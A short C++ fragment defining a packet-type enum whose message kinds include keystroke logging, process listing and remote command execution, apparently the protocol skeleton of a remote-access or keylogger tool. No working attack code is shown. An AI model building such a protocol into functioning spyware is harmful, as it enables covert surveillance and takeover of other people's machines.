#include <vector>
#include <string>
#include <cstdint>
#include <stdexcept>    
    
    enum class PacketType : uint8_t {
        GET_INFO = 1,
        KEYLOG = 2,
        PROCESS_LIST = 3,
        EXEC_COMMAND = 4,
        RESPONSE = 255,
        PACKET_ERROR = 254
    };